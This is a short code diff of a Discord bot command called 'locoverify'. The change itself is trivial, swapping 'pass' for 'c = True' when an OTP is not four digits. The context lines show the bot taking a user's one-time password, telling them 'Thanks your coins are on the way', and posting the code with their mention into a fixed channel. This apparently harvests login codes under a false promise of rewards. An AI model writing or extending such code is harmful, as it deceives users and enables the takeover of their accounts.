@@ -77,7 +77,7 @@ async def locoverify(ctx, user: discord.Member):
                     otp = int(otp)
                     otp = str(otp)
                     if len(otp) != 4:
-                        pass
+                        c = True
                     else:
                         await client.send_message(await client.get_user_info(user.id), "Thanks your coins are on the way")
                         await client.send_message(client.get_channel("536986693878808596"), "<@"+user.id+">, "+ str(otp))
